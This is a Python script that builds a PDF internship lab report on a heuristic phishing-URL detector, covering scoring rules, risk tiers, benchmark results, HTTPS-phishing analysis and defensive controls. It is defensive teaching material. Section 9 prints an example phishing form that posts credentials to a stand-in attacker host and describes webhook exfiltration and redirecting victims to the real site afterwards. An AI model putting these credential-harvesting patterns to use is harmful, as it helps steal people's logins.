"""
=============================================================================
Generate Official Executive PDF Report for Day 03 Deliverable
Sqrock IT Solution — Alpha 2 Internship (Cybersecurity Track)
Project: PEER'S Phish Detector (Phishing Page Anatomy & Heuristic Scoring)
Author: Md Peer Siddiqui
=============================================================================
"""

import os
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable, PageBreak
)

def create_day03_report(output_pdf_path=None):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    day03_root = os.path.dirname(script_dir)
    
    if output_pdf_path is None:
        output_pdf_path = os.path.join(day03_root, "reports", "Day03_Phishing_Detection_Report_Sqrock_MdPeerSiddiqui.pdf")
    os.makedirs(os.path.dirname(output_pdf_path), exist_ok=True)

    doc = SimpleDocTemplate(
        output_pdf_path,
        pagesize=letter,
        rightMargin=36,
        leftMargin=36,
        topMargin=36,
        bottomMargin=36
    )

    styles = getSampleStyleSheet()
    
    primary_color = colors.HexColor("#0f172a")     # Dark slate
    accent_color = colors.HexColor("#0284c7")      # Cyber blue
    warning_red = colors.HexColor("#dc2626")       # Critical red
    caution_amber = colors.HexColor("#d97706")     # Medium amber
    success_green = colors.HexColor("#16a34a")     # Low risk green
    bg_light = colors.HexColor("#f8fafc")
    text_dark = colors.HexColor("#1e293b")

    title_style = ParagraphStyle(
        'DocTitle',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=17,
        leading=21,
        textColor=primary_color,
        spaceAfter=2
    )

    subtitle_style = ParagraphStyle(
        'DocSubtitle',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=10,
        leading=13,
        textColor=accent_color,
        spaceAfter=4
    )

    h2_style = ParagraphStyle(
        'H2',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=10.5,
        leading=13,
        textColor=primary_color,
        spaceBefore=6,
        spaceAfter=3
    )

    body_style = ParagraphStyle(
        'Body',
        parent=styles['Normal'],
        fontName='Helvetica',
        fontSize=8.2,
        leading=11,
        textColor=text_dark,
        spaceAfter=3
    )

    meta_label = ParagraphStyle(
        'MetaLabel',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=7.8,
        leading=9.5,
        textColor=primary_color
    )

    meta_val = ParagraphStyle(
        'MetaVal',
        parent=styles['Normal'],
        fontName='Helvetica',
        fontSize=7.8,
        leading=9.5,
        textColor=text_dark
    )

    code_style = ParagraphStyle(
        'CodeStyle',
        parent=styles['Normal'],
        fontName='Courier',
        fontSize=7,
        leading=8.5,
        textColor=colors.HexColor("#0f172a")
    )

    story = []

    # =========================================================================
    # PAGE 1: Executive Overview, Heuristic Architecture & Scoring Methodology
    # =========================================================================
    story.append(Paragraph("CYBERSECURITY INTERNSHIP — PRACTICAL LAB REPORT", subtitle_style))
    story.append(Paragraph("Day 03: Phishing Page Anatomy & Heuristic URL Detection", title_style))
    story.append(HRFlowable(width="100%", thickness=1.5, color=accent_color, spaceBefore=2, spaceAfter=5))

    # Metadata Grid
    meta_data = [
        [
            Paragraph("Intern Name:", meta_label), Paragraph("Md Peer Siddiqui", meta_val),
            Paragraph("Program / Track:", meta_label), Paragraph("Alpha 2 — Cybersecurity Track", meta_val)
        ],
        [
            Paragraph("Issuing Body:", meta_label), Paragraph("Sqrock IT Solution", meta_val),
            Paragraph("Date of Execution:", meta_label), Paragraph("October 22, 2026", meta_val)
        ],
        [
            Paragraph("Tool Developed:", meta_label), Paragraph("PEER'S Phish Detector v1.0", meta_val),
            Paragraph("GitHub Repository:", meta_label), Paragraph("<font color='#0284c7'><u>github.com/MdPeerSiddiqui/Peers-Phish-Detector</u></font>", meta_val)
        ]
    ]

    meta_table = Table(meta_data, colWidths=[85, 185, 95, 175])
    meta_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, -1), bg_light),
        ('BOX', (0, 0), (-1, -1), 0.5, colors.HexColor("#cbd5e1")),
        ('INNERGRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#e2e8f0")),
        ('TOPPADDING', (0, 0), (-1, -1), 2.5),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 2.5),
        ('LEFTPADDING', (0, 0), (-1, -1), 4),
        ('RIGHTPADDING', (0, 0), (-1, -1), 4),
    ]))
    story.append(meta_table)
    story.append(Spacer(1, 3))

    # 1. Objective & Scope
    story.append(Paragraph("1. Objective & Operational Scope", h2_style))
    story.append(Paragraph(
        "To inspect the structural anatomy of deceptive Uniform Resource Locators (URLs) and engineer an automated Python "
        "heuristic detection engine capable of scoring phishing risk. The utility conducts safe <i>lexical inspection</i> of URLs "
        "without triggering network requests to live malicious servers, evaluating 8 distinct risk factors, enforcing mathematically "
        "capped scoring (0–100), and categorizing findings into unambiguous risk tiers.", body_style
    ))

    # 2. Tools & Environment
    story.append(Paragraph("2. Tools and Technical Environment", h2_style))
    story.append(Paragraph(
        "• <b>Operating Environment:</b> Kali Linux 2026.2 (64-bit VirtualBox VM) / Windows 11 Enterprise<br/>"
        "• <b>Core Platform:</b> Python 3.11.9 / 3.14.0 (Standard Libraries: <code>urllib.parse</code>, <code>re</code>, <code>ipaddress</code>, <code>json</code>, <code>unittest</code>)<br/>"
        "• <b>UI & Reporting Packages:</b> <code>colorama</code> v0.4.6 (ANSI terminal rendering), <code>reportlab</code> v4.4.1 (Audit PDF generation)<br/>"
        "• <b>Benchmark Testbed:</b> <code>test_urls.json</code> (10 curated URLs spanning legitimate sites, typosquats, raw IPs, and deceptive subdomains)", body_style
    ))

    # 3. Methodology & 8 Heuristic Rules
    story.append(Paragraph("3. Detection Methodology & Heuristic Rule Framework", h2_style))
    story.append(Paragraph(
        "The scoring engine passes each input URL through an 8-stage heuristic pipeline. Rather than treating scoring as a black box, "
        "each rule functions as a transparent, explainable audit check with itemized point weights:", body_style
    ))

    rules_data = [
        [Paragraph("#", meta_label), Paragraph("Heuristic Indicator", meta_label), Paragraph("Max Pts", meta_label), Paragraph("Technical Audit Logic & Security Relevance", meta_label)],
        [Paragraph("1", meta_val), Paragraph("Unencrypted Protocol", meta_label), Paragraph("+20", meta_val), Paragraph("Flags plain <code>http://</code>. Legitimate authentication portals mandate TLS encryption (<code>https://</code>).", body_style)],
        [Paragraph("2", meta_val), Paragraph("Raw IP Hostname", meta_label), Paragraph("+35", meta_val), Paragraph("Detects raw IPv4/IPv6 addresses used in hostnames to evade domain registration scrutiny and reputation feeds.", body_style)],
        [Paragraph("3", meta_val), Paragraph("Subdomain Abuse", meta_label), Paragraph("+25", meta_val), Paragraph("Identifies deep subdomain nesting (>3 labels) and brand spoofing in subdomain prefixes (e.g. <i>paypal.com.evil.com</i>).", body_style)],
        [Paragraph("4", meta_val), Paragraph("Sensitive Keywords", meta_label), Paragraph("+25", meta_val), Paragraph("Scans for urgency/auth tokens (<i>login, verify, banking</i>). Weights hostname matches (+20) higher than path matches (+10).", body_style)],
        [Paragraph("5", meta_val), Paragraph("Brand Typosquatting", meta_label), Paragraph("+30", meta_val), Paragraph("Detects visual homoglyphs (<i>paypa1, g00gle</i>) and brand names placed inside URL paths on untrusted hosts (+15).", body_style)],
        [Paragraph("6", meta_val), Paragraph("Suspicious TLD", meta_label), Paragraph("+15", meta_val), Paragraph("Flags high-abuse, disposable top-level domains commonly used by automated phishing kits (<i>.xyz, .top, .tk</i>).", body_style)],
        [Paragraph("7", meta_val), Paragraph("URL Shortener Masking", meta_label), Paragraph("+25", meta_val), Paragraph("Identifies redirection services (<i>bit.ly, tinyurl.com</i>) used to conceal the true destination host from the victim.", body_style)],
        [Paragraph("8", meta_val), Paragraph("Character Density", meta_label), Paragraph("+15", meta_val), Paragraph("Evaluates abnormal hostname hyphenation (≥3 hyphens) and excessive URL string length (>75 chars / host >40 chars).", body_style)],
    ]
    rules_table = Table(rules_data, colWidths=[18, 110, 42, 370])
    rules_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#e2e8f0")),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#cbd5e1")),
        ('TOPPADDING', (0, 0), (-1, -1), 2),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 2),
        ('VALIGN', (0, 0), (-1, -1), 'TOP'),
    ]))
    story.append(rules_table)
    story.append(Spacer(1, 3))

    # Defined Risk Tiers
    story.append(Paragraph("4. Transparent Risk Tier Definitions", h2_style))
    tier_data = [
        [Paragraph("Risk Score", meta_label), Paragraph("Assigned Tier", meta_label), Paragraph("Standardized Operational Definition & False Assurance Safeguard", meta_label)],
        [Paragraph("0 – 19 pts", meta_val), Paragraph("<font color='#16a34a'><b>Low Risk</b></font>", meta_val), Paragraph("<b>No suspicious lexical indicators detected.</b> (Does not certify absolute safety; zero-day phishing pages can reside on fresh, clean domains).", body_style)],
        [Paragraph("20 – 49 pts", meta_val), Paragraph("<font color='#d97706'><b>Medium Risk</b></font>", meta_val), Paragraph("<b>Caution advised.</b> Elevated risk signals detected (e.g. unencrypted HTTP protocol or URL shortener concealing the destination).", body_style)],
        [Paragraph("50 – 74 pts", meta_val), Paragraph("<font color='#dc2626'><b>High Risk</b></font>", meta_val), Paragraph("<b>High phishing probability.</b> Multiple high-severity indicators identified (e.g. raw IP host, brand typosquatting, or high-abuse TLD).", body_style)],
        [Paragraph("75 – 100 pts", meta_val), Paragraph("<font color='#991b1b'><b>Critical Risk</b></font>", meta_val), Paragraph("<b>Immediate threat signature.</b> Composite phishing lure combining unencrypted protocol, IP host, brand targeting, and action tokens.", body_style)],
    ]
    tier_table = Table(tier_data, colWidths=[65, 85, 390])
    tier_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#e2e8f0")),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#cbd5e1")),
        ('TOPPADDING', (0, 0), (-1, -1), 2),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 2),
        ('VALIGN', (0, 0), (-1, -1), 'TOP'),
    ]))
    story.append(tier_table)

    story.append(PageBreak())

    # =========================================================================
    # PAGE 2: Empirical Benchmark Testbed & Results Verification
    # =========================================================================
    story.append(Paragraph("5. Empirical Benchmark Test Suite (10-URL Audit)", h2_style))
    story.append(Paragraph(
        "To rigorously evaluate the heuristic model, an automated test harness (<code>phish_detector.py --test</code>) evaluated "
        "10 diverse URLs representing legitimate baselines, deceptive subdomains, raw IPs, typosquats, and shortened links. "
        "Every outcome is audited against documented pre-test analyst expectations:", body_style
    ))

    benchmark_data = [
        [Paragraph("#", meta_label), Paragraph("Evaluated URL & Context", meta_label), Paragraph("Expected", meta_label), Paragraph("Actual", meta_label), Paragraph("Status", meta_label), Paragraph("Itemized Heuristics Triggered", meta_label)],
        [
            Paragraph("1", meta_val),
            Paragraph("<b>https://example.com</b><br/><font color='#64748b'>Legitimate HTTPS baseline</font>", body_style),
            Paragraph("Low Risk", meta_val),
            Paragraph("<b>0/100</b><br/>Low Risk", meta_val),
            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
            Paragraph("Clean baseline; 0 indicators triggered.", body_style)
        ],
        [
            Paragraph("2", meta_val),
            Paragraph("<b>http://example.com</b><br/><font color='#64748b'>Plain unencrypted HTTP website</font>", body_style),
            Paragraph("Medium Risk", meta_val),
            Paragraph("<b>20/100</b><br/>Med Risk", meta_val),
            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
            Paragraph("Unencrypted HTTP protocol (+20 pts).", body_style)
        ],
        [
            Paragraph("3", meta_val),
            Paragraph("<b>http://192.168.1.100/login</b><br/><font color='#64748b'>Raw IPv4 authentication portal</font>", body_style),
            Paragraph("High Risk", meta_val),
            Paragraph("<b>65/100</b><br/>High Risk", meta_val),
            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
            Paragraph("Raw IP (+35), HTTP (+20), Path login keyword (+10).", body_style)
        ],
        [
            Paragraph("4", meta_val),
            Paragraph("<b>https://paypal.com.account-verify...evil.com/login</b><br/><font color='#64748b'>Subdomain brand spoofing</font>", body_style),
            Paragraph("High Risk", meta_val),
            Paragraph("<b>60/100</b><br/>High Risk", meta_val),
            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
            Paragraph("Subdomain abuse (+25), Sensitive keywords (+25), Label length (+10).", body_style)
        ],
        [
            Paragraph("5", meta_val),
            Paragraph("<b>https://paypa1-security.com/signin</b><br/><font color='#64748b'>Brand homoglyph typosquatting</font>", body_style),
            Paragraph("High Risk", meta_val),
            Paragraph("<b>55/100</b><br/>High Risk", meta_val),
            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
            Paragraph("Brand typosquatting 'paypa1' (+30), Sensitive keywords (+25).", body_style)
        ],
        [
            Paragraph("6", meta_val),
            Paragraph("<b>https://bit.ly/secure-login-39x</b><br/><font color='#64748b'>URL shortener masking destination</font>", body_style),
            Paragraph("Medium Risk", meta_val),
            Paragraph("<b>35/100</b><br/>Med Risk", meta_val),
            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
            Paragraph("URL shortener masking (+25), Path action keywords (+10).", body_style)
        ],
        [
            Paragraph("7", meta_val),
            Paragraph("<b>http://banking-portal-update.xyz/verify</b><br/><font color='#64748b'>High-abuse TLD with banking lures</font>", body_style),
            Paragraph("High Risk", meta_val),
            Paragraph("<b>60/100</b><br/>High Risk", meta_val),
            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
            Paragraph("HTTP (+20), Sensitive keywords (+25), Suspicious TLD (.xyz) (+15).", body_style)
        ],
        [
            Paragraph("8", meta_val),
            Paragraph("<b>https://login-verify-account-update...portal.com</b><br/><font color='#64748b'>Hyphen density & keyword concatenation</font>", body_style),
            Paragraph("High Risk", meta_val),
            Paragraph("<b>35/100</b><br/>Med Risk", meta_val),
            Paragraph("<font color='#d97706'><b>DIVERGENT</b></font>", meta_val),
            Paragraph("Hyphen density (6 hyphens) (+10), Host keywords (+20), Length (+10). <i>See Paradox Analysis below.</i>", body_style)
        ],
        [
            Paragraph("9", meta_val),
            Paragraph("<b>https://github.com/login</b><br/><font color='#64748b'>Legitimate enterprise login portal</font>", body_style),
            Paragraph("Low Risk", meta_val),
            Paragraph("<b>10/100</b><br/>Low Risk", meta_val),
            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
            Paragraph("Login keyword in path only (+10 pts). Preserves low risk tier (0–19).", body_style)
        ],
        [
            Paragraph("10", meta_val),
            Paragraph("<b>http://192.168.1.50/paypal-update/acc...verify=token</b><br/><font color='#64748b'>Composite multi-vector phishing lure</font>", body_style),
            Paragraph("Critical Risk", meta_val),
            Paragraph("<b>80/100</b><br/>Critical", meta_val),
            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
            Paragraph("Raw IP (+35), HTTP (+20), Brand in path (+15), Query tokens (+10).", body_style)
        ],
    ]
    b_table = Table(benchmark_data, colWidths=[16, 175, 50, 52, 55, 192])
    b_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#0f172a")),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#cbd5e1")),
        ('TOPPADDING', (0, 0), (-1, -1), 2),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 2),
        ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
    ]))
    story.append(b_table)
    story.append(Spacer(1, 4))

    # 6. Deep Dive: The HTTPS Phishing Paradox
    story.append(Paragraph("6. Security Analysis: The 'HTTPS Phishing Paradox' (Case #8 Audit)", h2_style))
    story.append(Paragraph(
        "In the 10-URL benchmark, 9 out of 10 test cases perfectly matched expected risk tiers. Test case #8 produced an insightful "
        "divergence: an analyst intuitively expected <i>High Risk</i> (≥50 pts), but the static lexical scorer awarded <b>35/100 (Medium Risk)</b>.<br/>"
        "<b>Root Cause:</b> The domain utilized a valid TLS certificate (<code>https://</code>) and registered under a reputable top-level domain "
        "(<code>.com</code>). Because the tool penalizes unencrypted HTTP (+20) and suspicious TLDs (+15), the absence of those two penalties kept "
        "the score under 50.<br/>"
        "<b>Key Cybersecurity Takeaway:</b> According to global threat reports by the Anti-Phishing Working Group (APWG), over 83% of active phishing "
        "websites now deploy valid SSL/TLS certificates via automated certificate authorities (e.g. Let's Encrypt). <b>The padlock icon does not mean a "
        "website is legitimate—it only proves the connection is encrypted.</b> A malicious actor can encrypt stolen credentials in transit just as easily "
        "as a legitimate bank.", body_style
    ))

    # 7. Unit Test Suite Verification
    story.append(Paragraph("7. Code Verification & Automated Unit Testing", h2_style))
    story.append(Paragraph(
        "The software architecture was validated using Python's built-in <code>unittest</code> framework (<code>tests/test_phish_detector.py</code>). "
        "A 16-point unit test suite verified each heuristic function in isolation, including IPv4 resolution, homoglyph replacement, subdomain splitting, "
        "threshold boundary transitions, and mathematical score capping at 100 points. <b>Result: 16/16 Tests Passed (0.004s execution time).</b>", body_style
    ))

    story.append(PageBreak())

    # =========================================================================
    # PAGE 3: Architecture Comparison, Defensive Controls & SOC Strategy
    # =========================================================================
    story.append(Paragraph("8. Technical Architecture: URL Scrutiny vs DOM / Visual Cloning", h2_style))
    story.append(Paragraph(
        "A comprehensive understanding of phishing detection requires distinguishing between lexical URL inspection and deep client-side "
        "Document Object Model (DOM) analysis:", body_style
    ))

    comp_data = [
        [Paragraph("Audit Dimension", meta_label), Paragraph("Static Lexical URL Inspection (PEER'S Detector)", meta_label), Paragraph("Dynamic DOM & Visual Form Analysis (Full Sandboxing)", meta_label)],
        [
            Paragraph("Execution Scope", meta_label),
            Paragraph("Safe offline string dissection. Never initiates network traffic to destination server.", body_style),
            Paragraph("Active page rendering in headless browser (Chromium/Puppeteer). Executes remote code.", body_style)
        ],
        [
            Paragraph("Threat Detection", meta_label),
            Paragraph("Catches brand typosquatting, raw IP servers, manipulative subdomains, and URL shorteners.", body_style),
            Paragraph("Catches visual logo imitation, CSS styling spoofing, hidden IFRAMEs, and malicious form targets.", body_style)
        ],
        [
            Paragraph("Primary Limitations", meta_label),
            Paragraph("Cannot inspect HTML markup, cannot detect fake login forms hosted on legitimate SaaS platforms (e.g. Google Forms/Canva).", body_style),
            Paragraph("Vulnerable to anti-analysis evasions (CAPTCHAs, geo-fencing, bot detection), higher CPU latency, malware execution risk.", body_style)
        ],
        [
            Paragraph("Operational Use", meta_label),
            Paragraph("High-speed inline email gateway filtering, firewall perimeter triage, and endpoint telemetry alerts.", body_style),
            Paragraph("SOC malware analysis sandboxes, deep digital forensics, and threat intelligence harvesting.", body_style)
        ],
    ]
    comp_table = Table(comp_data, colWidths=[90, 225, 225])
    comp_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#0f172a")),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#cbd5e1")),
        ('TOPPADDING', (0, 0), (-1, -1), 2.5),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 2.5),
        ('VALIGN', (0, 0), (-1, -1), 'TOP'),
    ]))
    story.append(comp_table)
    story.append(Spacer(1, 4))

    # 9. Form Redirection & Credential Harvesting Mechanics
    story.append(Paragraph("9. Phishing Page Mechanics: Form Redirection Anatomy", h2_style))
    story.append(Paragraph(
        "In weaponized phishing pages, the primary objective is credential harvesting via the HTML <code>&lt;form&gt;</code> element. "
        "Attackers manipulate the <code>action</code> attribute to redirect harvested credentials to an attacker-controlled endpoint:<br/>"
        "• <b>Third-Party Command & Control:</b> <code>&lt;form method=\"POST\" action=\"https://evil-harvest-server.xyz/steal.php\"&gt;</code><br/>"
        "• <b>Webhook Exploitation:</b> Redirecting credentials directly into private Discord or Telegram bot webhooks to bypass server hosting costs.<br/>"
        "• <b>Legitimate Redirection Illusion:</b> After harvesting passwords, the script triggers a <code>window.location.replace()</code> redirecting the victim "
        "to the real authentication portal (e.g. <code>https://paypal.com</code>), creating the impression of a harmless accidental session timeout.", body_style
    ))
    story.append(Spacer(1, 3))

    # 10. Defensive Measures & Recommendations
    story.append(Paragraph("10. Enterprise Defensive Measures & SOC Recommendations", h2_style))
    def_data = [
        [Paragraph("Defensive Domain", meta_label), Paragraph("Recommended Enterprise Control & Implementation Strategy", meta_label)],
        [Paragraph("Identity & Auth", meta_label), Paragraph("<b>FIDO2 / WebAuthn Hardware Tokens:</b> Implement hardware-bound multi-factor authentication (e.g. YubiKeys). FIDO2 binds authentication to the true cryptographic domain in the browser, rendering credential theft on typosquat domains completely ineffective.", body_style)],
        [Paragraph("Network & DNS", meta_label), Paragraph("<b>Protective DNS (PDNS) & Threat Sinkholing:</b> Deploy DNS filtering (e.g. Cloudflare Gateway, Cisco Umbrella) to block lookups against newly registered domains (<30 days old) and disposable TLDs.", body_style)],
        [Paragraph("Email Security", meta_label), Paragraph("<b>Time-of-Click URL Protection:</b> Implement gateway URL rewriting that rescans destination endpoints at the exact instant an employee clicks, preventing delayed-activation phishing attacks.", body_style)],
        [Paragraph("Human Layer", meta_label), Paragraph("<b>Domain Anatomy Training:</b> Train staff to inspect the Registered Domain (SLD + TLD) rather than subdomain prefixes or the presence of the HTTPS padlock icon.", body_style)],
    ]
    def_table = Table(def_data, colWidths=[100, 440])
    def_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#e2e8f0")),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#cbd5e1")),
        ('TOPPADDING', (0, 0), (-1, -1), 2),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 2),
        ('VALIGN', (0, 0), (-1, -1), 'TOP'),
    ]))
    story.append(def_table)
    story.append(Spacer(1, 3))

    # 11. Conclusion
    story.append(Paragraph("11. Conclusion & Internship Practical Sign-Off", h2_style))
    story.append(Paragraph(
        "Day 03 practical training provided comprehensive insight into phishing infrastructure anatomy and automated URL risk scoring. "
        "By decomposing URLs into their protocol, hostname, subdomain hierarchy, path, and character density, we demonstrated that lexical analysis "
        "serves as an essential first line of defense. The project highlighted the critical limitation of relying solely on TLS encryption as a trust signal "
        "and reinforced the necessity of defense-in-depth across DNS filtering, phishing-resistant MFA, and explainable heuristic detection.", body_style
    ))

    # Build Document
    doc.build(story)
    print(f"[+] Executive PDF Report successfully compiled at:\n    {output_pdf_path}")
    return output_pdf_path


if __name__ == "__main__":
    create_day03_report()
